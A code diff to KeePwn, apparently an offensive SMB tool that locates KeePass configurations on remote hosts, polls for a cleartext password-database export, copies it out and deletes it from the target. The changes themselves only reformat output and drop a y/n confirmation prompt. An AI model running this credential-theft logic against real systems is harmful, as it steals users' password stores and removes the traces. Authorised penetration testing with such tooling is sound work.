@@ -6,10 +6,9 @@ from time import sleep
 import chardet
 from lxml import etree
 from impacket.smbconnection import SessionError
-from termcolor import cprint
+from termcolor import cprint, colored
 
-from keepwn.utils.logging import print_error, print_info, print_success, Loader, print_alert, print_copied_export, \
-    print_found_export
+from keepwn.utils.logging import print_error, print_info, print_success, Loader, format_path
 from keepwn.utils.parser import parse_mandatory_options
 from keepwn.utils.smb import smb_connect
 
@@ -21,7 +20,7 @@ def get_config_file_path(smb_connection, share, config_path_parameter):
             config_path_parameter = config_path_parameter.split('$')[1]
         try:
             for file in smb_connection.listPath(share, config_path_parameter):
-                print_info("Found the specified KeePass configuration '\\\\{}{}'".format(share, config_path_parameter))
+                print_info("Found the specified KeePass configuration {}".format(format_path('\\\\{}{}'.format(share, config_path_parameter))))
                 return config_path_parameter
         except SessionError as e:
             print_error("The specified configuration file was not found, exiting")
@@ -42,7 +41,7 @@ def get_config_file_path(smb_connection, share, config_path_parameter):
         try:
             path = '\\Program Files\\KeePass Password Safe 2\\KeePass.config.xml'
             for file in smb_connection.listPath(share, path):
-                print_info("Found global KeePass configuration '\\\\{}{}'".format(share, path))
+                print_info("Found global KeePass configuration {}".format(format_path('\\\\{}{}'.format(share, path))))
                 global_config_file_content = read_config_file(smb_connection, share, path)
                 tree = etree.fromstring(global_config_file_content.encode())
                 found_trigger = False
@@ -50,10 +49,10 @@ def get_config_file_path(smb_connection, share, config_path_parameter):
                     # check that the local configuration file is in use (most cases)
                     # TODO: handle merge cases (see: https://keepass.info/help/kb/config_enf.html)
                     if configuration.text == 'false':
-                        print_info("PreferUserConfiguration flag is set to false, using the global configuration'")
+                        print_info("PreferUserConfiguration flag is set to " +colored('false', attrs=['bold'])+ ", using the global configuration'")
                         return path
                     elif configuration.text == 'true':
-                        print_info("PreferUserConfiguration flag is set to true, meaning that local configuration is used")
+                        print_info("PreferUserConfiguration flag is set to " +colored('true', attrs=['bold'])+ ", meaning that local configuration is used")
         except SessionError as e:
             pass  # the file was not found
 
@@ -71,12 +70,8 @@ def get_config_file_path(smb_connection, share, config_path_parameter):
             pass  # the file was not found
 
         if len(local_config_paths) == 1:
-            print_alert("Found local KeePass configuration '\\\\{}{}', do you want to use it [y/n]".format(share, local_config_paths[0]))
-            ans = input('> ')
-            if ans.lower() not in ['y', 'yes', '']:
-                exit(0)
-            else:
-                return local_config_paths[0]
+            print_info("Found local KeePass configuration {}".format(format_path('\\\\{}{}').format(share, local_config_paths[0])))
+            return local_config_paths[0]
         elif len(local_config_paths) == 0:
             print_error("No local KeePass configurations found, you can specify a pass with --config if it is somewhere else")
             exit()
@@ -278,7 +273,7 @@ def poll_trigger(options):
 
     export_path = None
     try:
-        with Loader("[>] Polling for database export every 5 seconds.. press CTRL+C to abort", end="Polling for database export every 5 seconds.. press CTRL+C to abort"):
+        with Loader("Polling for database export every 5 seconds.. press CTRL+C to abort", end="Polling for database export every 5 seconds.. press CTRL+C to abort. DONE"):
             while not export_path:
                 try:
                     for file in smb_connection.listPath(share, '\\Users\\*'):
@@ -296,7 +291,7 @@ def poll_trigger(options):
     except KeyboardInterrupt:
         exit()
 
-    print_found_export('\\\\{}\\{}'.format(share, export_path))
+    print_success("Found cleartext export {}".format(format_path('\\\\{}\\{}'.format(share, export_path))))
 
     try:
         buffer = BytesIO()
@@ -307,6 +302,6 @@ def poll_trigger(options):
             f.write(buffer.getbuffer())
 
         smb_connection.deleteFile(share, export_path)
-        print_copied_export("Moved remote export to '{}'".format(local_path))
+        print_success("Move remote export to {}".format(format_path(local_path)))
     except:
         print_error("Unkown error while getting export.")
